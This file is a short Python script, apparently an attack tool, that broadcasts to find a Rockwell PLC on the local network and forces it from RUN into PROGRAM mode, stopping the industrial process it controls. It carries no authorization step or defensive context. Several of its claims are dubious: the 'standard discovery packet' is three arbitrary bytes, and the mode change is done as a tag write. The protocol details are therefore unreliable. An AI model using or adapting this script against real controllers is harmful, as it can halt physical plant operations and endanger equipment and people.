from scapy.all import *
from pycomm3 import CIPDriver
import socket
import struct

# Function to discover Rockwell PLC on the network
def discover_plc():
    print("[+] Discovering Rockwell PLC on the network...")

    # Ethernet/IP specific UDP broadcast
    DISCOVERY_PORT = 44818  # Default port for EtherNet/IP
    DISCOVERY_MSG = bytes.fromhex("636861");  # Standard Rockwell discovery packet

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.settimeout(3)

    # Send broadcast request
    s.sendto(DISCOVERY_MSG, ('255.255.255.255', DISCOVERY_PORT))

    try:
        data, addr = s.recvfrom(1024)
        plc_ip = addr[0]
        print(f"[+] PLC Found at {plc_ip}")
        return plc_ip
    except socket.timeout:
        print("[-] Discovery timed out. No PLC found.")
        return None

# Function to change PLC mode using EtherNet/IP CIP services
def change_plc_mode(plc_ip, mode):
    """
    Changes the operating mode of the Micro850 via EtherNet/IP CIP services.
    mode = 1 (PROGRAM), mode = 2 (RUN)
    """
    if mode not in [1, 2]:
        print("[-] Invalid mode selected.")
        return

    MODE_MAP = {1: "PROGRAM", 2: "RUN"}
    
    print(f"[+] Attempting to change PLC mode to {MODE_MAP[mode]}...")
    
    with CIPDriver(f"{plc_ip}") as plc:
        response = plc.write("ModeChangeRequest", mode)
        
        if response:
            print(f"[+] Successfully changed PLC to {MODE_MAP[mode]} mode.")
        else:
            print("[-] Failed to change PLC mode.")

# Main Execution
if __name__ == "__main__":
    plc_ip = discover_plc()
    
    if plc_ip:
        change_plc_mode(plc_ip, mode=1)  # Change to PROGRAM mode